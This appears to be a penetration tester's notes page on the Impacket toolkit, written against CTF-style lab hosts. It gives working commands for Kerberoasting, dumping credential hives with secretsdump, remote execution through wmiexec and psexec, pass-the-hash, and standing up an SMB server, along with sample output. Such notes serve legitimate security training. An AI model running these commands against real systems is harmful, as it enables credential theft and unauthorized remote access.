---
tags:
  - Exploitation
  - OperatingSystems
  - Windows
  - Tooling
  - Impacket
---
[Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.

## Installation

```
python3 -m pipx install impacket
```

1. [Impacket Guide: SMB/MSRPC - Hacking Articles](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

## Usage
### Locating Credentials

```
sudo python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783
```

### Dump Credentials 

[impacket/examples/secretsdump.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

```shell-session
locate secretsdump 
```

```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Remote Access with Credentials


```
wmiexec.py 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
```

```
python psexec.py  active.htb/administrator:Ticketmaster1968@10.10.10.100
```

### SMB 

See [[2. Enumeration/TCP/445. Server Message Block (SMB)/1. Guide|SMB Guide]] 

1. Can use `psexec.py` to get reverse shell if write access to the entire system

#### Create SMB Server 

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
### SamRDump

```shell-session
samrdump.py 10.129.14.128
```

### RPCDump

[impacket/examples/rpcdump.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py)

### WMI

```shell-session
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

## Pass the Hash

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), see [[SSH Tunnelling#Chisel]]
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Impacket Ticket Converter

[impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) 